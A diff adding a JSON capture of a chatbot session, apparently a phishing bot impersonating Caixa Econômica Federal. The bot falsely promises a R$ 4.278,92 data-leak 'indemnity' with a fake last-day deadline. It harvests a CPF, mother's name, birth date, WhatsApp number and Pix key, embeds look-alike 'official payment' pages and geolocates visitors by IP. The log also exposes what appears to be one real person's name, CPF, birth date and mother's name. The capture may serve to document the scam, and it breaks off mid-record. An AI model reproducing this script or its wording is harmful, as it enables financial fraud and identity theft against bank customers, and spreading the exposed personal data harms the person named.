@@ -1,0 +1,1899 @@
+{
+  "requests": [
+    {
+      "url": "https://viewer-production-9742.up.railway.app/api/v1/typebots/rodando-v-3-apinovo-m4n9uej/startChat",
+      "method": "GET",
+      "data": {
+        "sessionId": "cmg7b1zv3jhsi7c3fj8a5vwiq",
+        "resultId": "gyi6nzhq5yybhpp0j311uafn",
+        "typebot": {
+          "id": "cmf19h11y003dlhbmnm4n9uej",
+          "version": "6",
+          "theme": {
+            "general": {
+              "font": {
+                "type": "Custom",
+                "family": "",
+                "css": "/* Importa a fonte Montserrat */\n@import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');\n\n/* Aplica a fonte em todo o bot */\n* {\n  font-family: 'Montserrat', sans-serif !important;\n}\n\n/* Mensagens do bot (fundo cinza claro) */\n.message.bot {\n  background-color: #F5F5F5 !important;\n  color: #000000 !important;\n  border-radius: 18px !important;\n  padding: 10px 14px !important;\n  font-size: 15px !important;\n  line-height: 1.4em !important;\n}\n\n/* Mensagens do usuário (fundo azul Caixa) */\n.message.user {\n  background-color: #005CA9 !important;\n  color: #FFFFFF !important;\n  border-radius: 18px !important;\n  padding: 10px 14px !important;\n  font-size: 15px !important;\n  line-height: 1.4em !important;\n}\n\n/* Texto em negrito */\nstrong, b {\n  font-weight: 700 !important;\n}\n\n/* Remove sombras e deixa mais limpo */\n.message {\n  box-shadow: none !important;\n}\n\n/* Ajuste do fundo da área de conversa */\n.chat-container {\n  background-color: #FFFFFF !important;\n}\n"
+              },
+              "progressBar": {
+                "isEnabled": false
+              }
+            },
+            "chat": {
+              "container": {
+                "backgroundColor": "#ffffff",
+                "opacity": 1
+              },
+              "hostAvatar": {
+                "isEnabled": false,
+                "url": "https://minio-production-a5c3.up.railway.app/typebot/public/workspaces/cmdff715k0001u9cgb2z5q8hc/typebots/cmeajdg4g001vlhbm9vwx4wvh/hostAvatar?v=1755184595776"
+              },
+              "guestAvatar": {
+                "isEnabled": false,
+                "url": "https://minio-production-a5c3.up.railway.app/typebot/public/workspaces/cmdff715k0001u9cgb2z5q8hc/typebots/cmdhy9nhy0008lhbmygh56msv/guestAvatar?v=1753430938161"
+              },
+              "hostBubbles": {
+                "backgroundColor": "#ffffff",
+                "shadow": "sm",
+                "border": {
+                  "thickness": 0,
+                  "roundeness": "medium",
+                  "opacity": 0.1
+                }
+              },
+              "guestBubbles": {
+                "backgroundColor": "#0049a8",
+                "border": {
+                  "roundeness": "large"
+                }
+              },
+              "buttons": {
+                "backgroundColor": "#F37021",
+                "border": {
+                  "thickness": 6,
+                  "roundeness": "large"
+                }
+              },
+              "inputs": {
+                "border": {
+                  "thickness": 1,
+                  "roundeness": "custom",
+                  "customRoundeness": 15
+                }
+              },
+              "buttonsInput": {
+                "layout": "vertical"
+              }
+            }
+          },
+          "settings": {
+            "metadata": {
+              "customHeadCode": ""
+            }
+          },
+          "publishedAt": "2025-09-27T17:58:49.270Z"
+        },
+        "messages": [
+          {
+            "id": "dk62ngavsnlp62uyqd8l2dzw",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "bold": true,
+                      "text": "Esse é um canal oficial da CAIXA ECONÔMICA FEDERAL, seus dados estão seguros"
+                    }
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "id": "d9vmbdnllv48ul7autztd6ej",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Digite somente os "
+                    },
+                    {
+                      "bold": true,
+                      "text": "números"
+                    },
+                    {
+                      "text": " do seu "
+                    },
+                    {
+                      "bold": true,
+                      "text": "CPF"
+                    },
+                    {
+                      "text": ", sem traços ou pontos, para "
+                    },
+                    {
+                      "bold": true,
+                      "text": "criar"
+                    },
+                    {
+                      "text": " ou "
+                    },
+                    {
+                      "bold": true,
+                      "text": "acessar"
+                    },
+                    {
+                      "text": " sua "
+                    },
+                    {
+                      "bold": true,
+                      "text": "conta"
+                    },
+                    {
+                      "text": " no gov.br. "
+                    }
+                  ]
+                }
+              ]
+            }
+          }
+        ],
+        "input": {
+          "id": "u5l6azd9lqneldtzk1l6ded2",
+          "outgoingEdgeId": "ifibpwnpnwronsy3166uf3u9",
+          "type": "text input",
+          "options": {
+            "labels": {
+              "placeholder": "Digite seu CPF",
+              "button": "Enviar"
+            },
+            "variableId": "vbhaxvzozi71jed2i6ccllqek"
+          }
+        },
+        "clientSideActions": [
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 3
+            },
+            "lastBubbleBlockId": "dk62ngavsnlp62uyqd8l2dzw"
+          }
+        ],
+        "logs": []
+      },
+      "timestamp": "2025-10-01T01:26:00.391Z"
+    },
+    {
+      "url": "https://viewer-production-9742.up.railway.app/api/v1/sessions/cmg7b1zv3jhsi7c3fj8a5vwiq/continueChat",
+      "method": "GET",
+      "data": {
+        "messages": [],
+        "clientSideActions": [
+          {
+            "type": "setVariable",
+            "setVariable": {
+              "scriptToExecute": {
+                "content": "async function obterEstado() {\n    try {\n        const response = await fetch('https://ipinfo.io/json');\n        const data = await response.json();\n        const estado = (data.region || \"Estado Desconhecido\").toUpperCase();\n        return estado;\n    } catch (error) {\n        console.error('Erro ao obter o estado:', error);\n        return \"ESTADO DESCONHECIDO\";\n    }\n}\n\nreturn await obterEstado();\n",
+                "isCode": true,
+                "args": []
+              }
+            },
+            "expectsDedicatedReply": true
+          }
+        ],
+        "logs": []
+      },
+      "timestamp": "2025-10-01T01:26:15.885Z"
+    },
+    {
+      "url": "https://viewer-production-9742.up.railway.app/api/v1/sessions/cmg7b1zv3jhsi7c3fj8a5vwiq/continueChat",
+      "method": "GET",
+      "data": {
+        "messages": [
+          {
+            "id": "acyxve7q34wnlwis07gmxa4b",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Olá, "
+                    },
+                    {
+                      "type": "inline-variable",
+                      "children": [
+                        {
+                          "type": "p",
+                          "children": [
+                            {
+                              "bold": true,
+                              "text": "Jose Nilton Dourado Da Silva"
+                            }
+                          ]
+                        }
+                      ]
+                    },
+                    {
+                      "text": "!"
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": ""
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Seja bem-vindo (a) ao nosso atendimento."
+                    }
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "id": "tlf5t5pp2250p6rb10ivasnv",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Os próximos passos vão ser de "
+                    },
+                    {
+                      "bold": true,
+                      "text": "extrema importância."
+                    }
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "id": "docfeg1knp50jxigk38kkp8h",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Você vai receber "
+                    },
+                    {
+                      "bold": true,
+                      "text": "R$ 4.278,92 "
+                    },
+                    {
+                      "text": "de indenização pelo vazamento de dados do "
+                    },
+                    {
+                      "bold": true,
+                      "text": "Caixa Tem."
+                    }
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "id": "xc0ynf3jvjsvuaxoafsg46mm",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Hoje é o último dia para resgatar seu valor."
+                    }
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "id": "v1rixpt18xoaa4somrc2hf9c",
+            "type": "embed",
+            "content": {
+              "url": "https://player-vz-684f8f8a-d47.tv.pandavideo.com.br/embed/?v=c7dfa7a6-622c-43ab-9832-548b7bbe8aab",
+              "height": 442
+            }
+          },
+          {
+            "id": "enos4nano7k48mqzc5imcluh",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Para continuar com o seu saque, precisamos confirmar sua identidade."
+                    }
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "id": "olqvzft40qhdv7yeybk6ker0",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Responda as perguntas a seguir para a aprovação do seu saque de "
+                    },
+                    {
+                      "bold": true,
+                      "text": "R$ 4.278,92"
+                    }
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "id": "ur4z1trtjcvv0je36tiypqo2",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "bold": true,
+                      "text": "Por favor, confirme o nome da sua mãe."
+                    }
+                  ]
+                }
+              ]
+            }
+          }
+        ],
+        "input": {
+          "id": "yjfcli6grqniprx7cz1sllh4",
+          "type": "choice input",
+          "items": [
+            {
+              "id": "rf85dc17q8phewv5ljx10pei",
+              "outgoingEdgeId": "v1x0z1piwp8zf478yf2o1d33",
+              "content": "Maria da Silva Albuquerque"
+            },
+            {
+              "id": "ezbwux4njtbd48hhamtug02d",
+              "outgoingEdgeId": "qd8rvylf2cm5gf19ylz364xx",
+              "content": "Antonieta Condori Santos"
+            },
+            {
+              "id": "ndp719uwfavyt8qxeh3ymr1b",
+              "outgoingEdgeId": "gzpseie871pt36vcnzk4mfft",
+              "content": "Terezinha Jesus Dourado Da Si"
+            },
+            {
+              "id": "z7zxztt0fhl52ezn8y5mglx8",
+              "outgoingEdgeId": "p3g6fwucjjroj1sm2n42a9i8",
+              "content": "Raquel Santhiago Souza"
+            },
+            {
+              "id": "ruk9e7bltzhijnpo5v47usln",
+              "outgoingEdgeId": "vf15pd1jljk9dcbolxyn4yqh",
+              "content": "Nenhuma das alternativas."
+            }
+          ]
+        },
+        "clientSideActions": [
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 2
+            },
+            "lastBubbleBlockId": "acyxve7q34wnlwis07gmxa4b"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 2
+            },
+            "lastBubbleBlockId": "tlf5t5pp2250p6rb10ivasnv"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 2
+            },
+            "lastBubbleBlockId": "docfeg1knp50jxigk38kkp8h"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 2
+            },
+            "lastBubbleBlockId": "xc0ynf3jvjsvuaxoafsg46mm"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 28
+            },
+            "lastBubbleBlockId": "v1rixpt18xoaa4somrc2hf9c"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 3
+            },
+            "lastBubbleBlockId": "enos4nano7k48mqzc5imcluh"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 3
+            },
+            "lastBubbleBlockId": "olqvzft40qhdv7yeybk6ker0"
+          }
+        ]
+      },
+      "timestamp": "2025-10-01T01:26:16.326Z"
+    },
+    {
+      "url": "https://viewer-production-9742.up.railway.app/api/v1/sessions/cmg7b1zv3jhsi7c3fj8a5vwiq/continueChat",
+      "method": "GET",
+      "data": {
+        "messages": [
+          {
+            "id": "xu6qx0uxew4bnertfwwn5w4w",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Resposta incorreta! Tente novamente."
+                    }
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "id": "ur4z1trtjcvv0je36tiypqo2",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "bold": true,
+                      "text": "Por favor, confirme o nome da sua mãe."
+                    }
+                  ]
+                }
+              ]
+            }
+          }
+        ],
+        "input": {
+          "id": "yjfcli6grqniprx7cz1sllh4",
+          "type": "choice input",
+          "items": [
+            {
+              "id": "rf85dc17q8phewv5ljx10pei",
+              "outgoingEdgeId": "v1x0z1piwp8zf478yf2o1d33",
+              "content": "Maria da Silva Albuquerque"
+            },
+            {
+              "id": "ezbwux4njtbd48hhamtug02d",
+              "outgoingEdgeId": "qd8rvylf2cm5gf19ylz364xx",
+              "content": "Antonieta Condori Santos"
+            },
+            {
+              "id": "ndp719uwfavyt8qxeh3ymr1b",
+              "outgoingEdgeId": "gzpseie871pt36vcnzk4mfft",
+              "content": "Terezinha Jesus Dourado Da Si"
+            },
+            {
+              "id": "z7zxztt0fhl52ezn8y5mglx8",
+              "outgoingEdgeId": "p3g6fwucjjroj1sm2n42a9i8",
+              "content": "Raquel Santhiago Souza"
+            },
+            {
+              "id": "ruk9e7bltzhijnpo5v47usln",
+              "outgoingEdgeId": "vf15pd1jljk9dcbolxyn4yqh",
+              "content": "Nenhuma das alternativas."
+            }
+          ]
+        }
+      },
+      "timestamp": "2025-10-01T01:27:23.824Z"
+    },
+    {
+      "url": "https://viewer-production-9742.up.railway.app/api/v1/sessions/cmg7b1zv3jhsi7c3fj8a5vwiq/continueChat",
+      "method": "GET",
+      "data": {
+        "messages": [
+          {
+            "id": "cwq1gnwq6ffcqjh4pif4xcut",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Resposta Correta! ✅"
+                    }
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "id": "wh1bho16k8z4jpeqxgp33hn9",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "bold": true,
+                      "text": "Qual sua data de nascimento?"
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "bold": true,
+                      "text": ""
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Escolha a alternativa correta."
+                    }
+                  ]
+                }
+              ]
+            }
+          }
+        ],
+        "input": {
+          "id": "zqe4hexk1ldzirb7dvirrn3a",
+          "type": "choice input",
+          "items": [
+            {
+              "id": "wm8aq8is2jam44vfpza9ewl1",
+              "outgoingEdgeId": "iqh7csi8ynxxbesiv350h6nd",
+              "content": "29/01/1961"
+            },
+            {
+              "id": "ycog2e8xg0qjxvagz0j1y589",
+              "outgoingEdgeId": "elpbd4mrhtrh4aenah5mlm5p",
+              "content": "19/05/1996"
+            },
+            {
+              "id": "xvpaly8uib8k7vcys73jnsyj",
+              "outgoingEdgeId": "oduhgbhw7fi1gdglya39g497",
+              "content": "02/11/2001"
+            },
+            {
+              "id": "m9znqbxbf6m5l6wy5wlpkdpo",
+              "outgoingEdgeId": "p4zq99oxudeq75nkcwgled3b",
+              "content": "25/02/1982"
+            }
+          ]
+        },
+        "clientSideActions": [
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 1
+            },
+            "lastBubbleBlockId": "cwq1gnwq6ffcqjh4pif4xcut"
+          }
+        ]
+      },
+      "timestamp": "2025-10-01T01:27:29.528Z"
+    },
+    {
+      "url": "https://viewer-production-9742.up.railway.app/api/v1/sessions/cmg7b1zv3jhsi7c3fj8a5vwiq/continueChat",
+      "method": "GET",
+      "data": {
+        "messages": [
+          {
+            "id": "m22hsuxc9e6ujer1h2gjbufo",
+            "type": "image",
+            "content": {
+              "url": "https://minio-production-a5c3.up.railway.app/typebot/public/workspaces/cmdff715k0001u9cgb2z5q8hc/typebots/cmeiyabui0023lhbmt6gaayx4/blocks/m22hsuxc9e6ujer1h2gjbufo?v=1755633373601"
+            }
+          },
+          {
+            "id": "xs7x1wojmnsg0bchid49eavw",
+            "type": "image",
+            "content": {
+              "url": "https://minio-production-a5c3.up.railway.app/typebot/public/workspaces/cmdff715k0001u9cgb2z5q8hc/typebots/cmeiyabui0023lhbmt6gaayx4/blocks/xs7x1wojmnsg0bchid49eavw?v=1755633416500"
+            }
+          },
+          {
+            "id": "vwb7rcj6qm4cf5tsc4m5n9kd",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "bold": true,
+                      "text": "Identidade Confirmada com sucesso!"
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "bold": true,
+                      "text": ""
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "bold": true,
+                      "text": "Nome:"
+                    },
+                    {
+                      "text": " "
+                    },
+                    {
+                      "type": "inline-variable",
+                      "children": [
+                        {
+                          "type": "p",
+                          "children": [
+                            {
+                              "text": "Jose Nilton Dourado Da Silva"
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "bold": true,
+                      "text": "CPF: "
+                    },
+                    {
+                      "type": "p",
+                      "children": [
+                        {
+                          "text": "19777892349"
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "bold": true,
+                      "text": "Data de Nascimento: "
+                    },
+                    {
+                      "type": "p",
+                      "children": [
+                        {
+                          "text": "29/01/1961"
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "bold": true,
+                      "text": "Nome da mãe: "
+                    },
+                    {
+                      "type": "p",
+                      "children": [
+                        {
+                          "text": "Terezinha Jesus Dourado Da Si"
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": ""
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "bold": true,
+                      "text": "Indenização: "
+                    },
+                    {
+                      "text": "R$ 4.278,92"
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "bold": true,
+                      "text": "Status: "
+                    },
+                    {
+                      "text": "☑️ Pre-aprovado"
+                    }
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "id": "q4ztwz6dcinzhykiarfvjvff",
+            "type": "embed",
+            "content": {
+              "url": "https://confirmado-pagamentooficiais.com/audio.html?avatar=https://minio-production-a5c3.up.railway.app/typebot/public/workspaces/cmdff715k0001u9cgb2z5q8hc/typebots/cmf19h11y003dlhbmnm4n9uej/blocks/f4wz5b9q7cwynjzk6daw9cef?v=1758995831637?v=1758992866341?v=1755759669312&bg=%230764ad&ring=%23e6f2f4&accent=%23ffffff&src=https://minio-production-a5c3.up.railway.app/typebot/public/workspaces/cmdff715k0001u9cgb2z5q8hc/typebots/cmf19h11y003dlhbmnm4n9uej/blocks/g561osf17w1pw04rfiuwyxns?v=1758992406869",
+              "height": 140
+            }
+          },
+          {
+            "id": "iie3srhsmkbtgy5yp2dzpboj",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "bold": true,
+                      "text": "Estamos quase lá! "
+                    },
+                    {
+                      "text": "Para podermos "
+                    },
+                    {
+                      "bold": true,
+                      "text": "completar"
+                    },
+                    {
+                      "text": " a sua "
+                    },
+                    {
+                      "bold": true,
+                      "text": "aprovação"
+                    },
+                    {
+                      "text": ", precisamos enviar o "
+                    },
+                    {
+                      "bold": true,
+                      "text": "comprovante"
+                    },
+                    {
+                      "text": " "
+                    },
+                    {
+                      "bold": true,
+                      "text": "de"
+                    },
+                    {
+                      "text": " "
+                    },
+                    {
+                      "bold": true,
+                      "text": "transferência"
+                    },
+                    {
+                      "text": ". Por favor, informe seu "
+                    },
+                    {
+                      "bold": true,
+                      "text": "número"
+                    },
+                    {
+                      "text": " de "
+                    },
+                    {
+                      "bold": true,
+                      "text": "WhatsApp"
+                    },
+                    {
+                      "text": "."
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": ""
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Ex: 11912345678"
+                    }
+                  ]
+                }
+              ]
+            }
+          }
+        ],
+        "input": {
+          "id": "t0vf78618cw66zjua0qxvzpf",
+          "outgoingEdgeId": "ubddtbwzgyaa98mr5tygynk4",
+          "type": "phone number input",
+          "options": {
+            "variableId": "vjbweuhisanfkzg3lwtrbduck",
+            "labels": {
+              "placeholder": "Digite seu número...",
+              "button": "Enviar"
+            },
+            "retryMessageContent": "Esse número não existe, tente novamente...",
+            "defaultCountryCode": "BR"
+          }
+        },
+        "clientSideActions": [
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 3
+            },
+            "lastBubbleBlockId": "m22hsuxc9e6ujer1h2gjbufo"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 3
+            },
+            "lastBubbleBlockId": "xs7x1wojmnsg0bchid49eavw"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 3
+            },
+            "lastBubbleBlockId": "vwb7rcj6qm4cf5tsc4m5n9kd"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 15
+            },
+            "lastBubbleBlockId": "q4ztwz6dcinzhykiarfvjvff"
+          }
+        ]
+      },
+      "timestamp": "2025-10-01T01:27:43.591Z"
+    },
+    {
+      "url": "https://viewer-production-9742.up.railway.app/api/v1/sessions/cmg7b1zv3jhsi7c3fj8a5vwiq/continueChat",
+      "method": "GET",
+      "data": {
+        "messages": [
+          {
+            "id": "ut11tpygr6qj64hawmli1bzp",
+            "type": "embed",
+            "content": {
+              "url": "https://embeds-azul.lsnuat.easypanel.host/embed-04/?name=Jose Nilton Dourado Da Silva&telephone=+5511912345678",
+              "height": 250
+            }
+          },
+          {
+            "id": "yu116omzwruec3f70naged88",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Solicitando aprovação do saque da sua indenização..."
+                    }
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "id": "bh81uwjizdre7xgu04z661f3",
+            "type": "embed",
+            "content": {
+              "url": "https://embeds-azul.lsnuat.easypanel.host/embed-05/?nome=Jose&cpf=19777892349",
+              "height": 921
+            }
+          },
+          {
+            "id": "v3diojmblzykrf9z6jibtqj8",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Sua indenização foi "
+                    },
+                    {
+                      "bold": true,
+                      "text": "aprovada com sucesso!  "
+                    },
+                    {
+                      "text": " ✅"
+                    }
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "id": "suc6he5iofyab0m7ofg2qpaz",
+            "type": "embed",
+            "content": {
+              "url": "https://confirmado-pagamentooficiais.com/audio.html?avatar=https://minio-production-a5c3.up.railway.app/typebot/public/workspaces/cmdff715k0001u9cgb2z5q8hc/typebots/cmf19h11y003dlhbmnm4n9uej/blocks/f4wz5b9q7cwynjzk6daw9cef?v=1758995831637?v=1758992866341?v=1755759669312&bg=%230764ad&ring=%23e6f2f4&accent=%23ffffff&src=https://minio-production-a5c3.up.railway.app/typebot/public/workspaces/cmdff715k0001u9cgb2z5q8hc/typebots/cmf19h11y003dlhbmnm4n9uej/blocks/z4pxklzpiu9vkkl41ixqjo70?v=1758992412175",
+              "height": 135
+            }
+          },
+          {
+            "id": "z22x64a5bu2bp8cbfcs4a7pj",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Escolha abaixo o tipo de "
+                    },
+                    {
+                      "bold": true,
+                      "text": "Chave Pix"
+                    },
+                    {
+                      "text": " que você deseja receber a sua quantia."
+                    }
+                  ]
+                }
+              ]
+            }
+          }
+        ],
+        "input": {
+          "id": "iex3u0mpf7n4qv2594i08qfe",
+          "type": "choice input",
+          "items": [
+            {
+              "id": "nzctwlltifubpnoqgu3e47o0",
+              "outgoingEdgeId": "fymqbmuh6hbqt0zygt7drs1p",
+              "content": "Telefone"
+            },
+            {
+              "id": "epjcp89dwnmqxkm25as1k055",
+              "outgoingEdgeId": "jlsudv7xjyfk440bswht5lbb",
+              "content": "CPF"
+            },
+            {
+              "id": "cnmxeazhfufd3i2qh2ouo2ns",
+              "outgoingEdgeId": "vb2xyn4qlcst56lsf0rbopor",
+              "content": "Email"
+            }
+          ],
+          "options": {
+            "variableId": "vhwhlu63bnglo8mpspmqvfvyy"
+          }
+        },
+        "clientSideActions": [
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 2
+            },
+            "lastBubbleBlockId": "ut11tpygr6qj64hawmli1bzp"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 3
+            },
+            "lastBubbleBlockId": "yu116omzwruec3f70naged88"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 51
+            },
+            "lastBubbleBlockId": "bh81uwjizdre7xgu04z661f3"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 3
+            },
+            "lastBubbleBlockId": "v3diojmblzykrf9z6jibtqj8"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 13
+            },
+            "lastBubbleBlockId": "suc6he5iofyab0m7ofg2qpaz"
+          },
+          {
+            "type": "wait",
+            "wait": {
+              "secondsToWaitFor": 4
+            },
+            "lastBubbleBlockId": "z22x64a5bu2bp8cbfcs4a7pj"
+          }
+        ]
+      },
+      "timestamp": "2025-10-01T01:28:32.239Z"
+    },
+    {
+      "url": "https://viewer-production-9742.up.railway.app/api/v1/sessions/cmg7b1zv3jhsi7c3fj8a5vwiq/continueChat",
+      "method": "GET",
+      "data": {
+        "messages": [
+          {
+            "id": "pbxa48aoqg92629n7udfy140",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "bold": true,
+                      "text": "ATENÇÃO: "
+                    },
+                    {
+                      "text": "Confirme se a CHAVE PIX informada está correta. "
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "bold": true,
+                      "text": ""
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "bold": true,
+                      "text": "Nome:"
+                    },
+                    {
+                      "text": " "
+                    },
+                    {
+                      "type": "inline-variable",
+                      "children": [
+                        {
+                          "type": "p",
+                          "children": [
+                            {
+                              "text": "Jose Nilton Dourado Da Silva"
+                            }
+                          ]
+                        }
+                      ]
+                    },
+                    {
+                      "bold": true,
+                      "text": "\nChave Pix:"
+                    },
+                    {
+                      "text": " "
+                    },
+                    {
+                      "type": "inline-variable",
+                      "children": [
+                        {
+                          "type": "p",
+                          "children": [
+                            {
+                              "text": "19777892349"
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "\nA Caixa Econômica Federal não se responsabiliza em casos de transferências em chave pix erradas."
+                    }
+                  ]
+                }
+              ]
+            }
+          }
+        ],
+        "input": {
+          "id": "kv4cidfzbxkjsp0lfgm0v2fn",
+          "type": "choice input",
+          "items": [
+            {
+              "id": "p8fqtt4ahnqxcu7n6js8erqt",
+              "outgoingEdgeId": "y7rsvgsvvodr2s5hv1clcxgy",
+              "content": "Sim, está correto."
+            },
+            {
+              "id": "sxdvvv4z3y4hvxrudk6fhq1d",
+              "outgoingEdgeId": "nmz95fv5j8lsdo34q26uodws",
+              "content": "Não, desejo corrigir"
+            }
+          ]
+        }
+      },
+      "timestamp": "2025-10-01T01:30:08.298Z"
+    },
+    {
+      "url": "https://viewer-production-9742.up.railway.app/api/v1/sessions/cmg7b1zv3jhsi7c3fj8a5vwiq/continueChat",
+      "method": "GET",
+      "data": {
+        "messages": [
+          {
+            "id": "efp1o7enloqmfuuxlxqz2kv8",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Aguarde! Processando solicitação do cadastro chave pix...",
+                      "italic": true
+                    }
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "id": "f3sc8prheptpbgchvd01mv9e",
+            "type": "text",
+            "content": {
+              "type": "richText",
+              "richText": [
+                {
+                  "type": "p",
+                  "children": [
+                    {
+                      "text": "Finalizando processamento...",
+                      "italic": true
+                    }
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "id": "ewm8wmpgq16vevb46qeyca1l",
+            "type": "image",
+            "content": {
+              "url": "https://minio-production-a5c3.up.railway.app/typebot/public/workspaces/cmdff715k0001u9cgb2z5q8hc/typebots/cmeajdg4g001vlhbm9vwx4wvh/blocks/ewm8wmpgq16vevb46qeyca1l?v=1755164955179"
+            }
+          },
+          {
+            "id": "go679p49zmrsk056izjq08wu",
+            "type": "embed",
+            "content": {
+              "url": "https://confirmado-pagamentooficiais.com/audio.html?avatar=https://minio-production-a5c3.up.railway.app/typebot/public/workspaces/cmdff715k0001u9cgb2z5q8hc/typebots/cmf19h11y003dlhbmnm4n9uej/blocks/f4wz5b9q7cwynjzk6daw9cef?v=1758995831637?v=1758992866341?v=1755759669312&bg=%230764ad&ring=%23e6f2f4&accent=%23ffffff&src=https://minio-production-a5c3.up.railway.app/typebot/public/workspaces/cmdff715k0001u9cgb2z5q8hc/typebots/cmf19h11y003dlhbmnm4n9uej/blocks/w46pivugdnoa6lck93kauobw?v=1758992417206",
+              "height": 135
+            }
+          },
+          {
+            "id": "ehphqj36j3l5lf8fugspip1a",
+            "type": "text",
+            "content": {
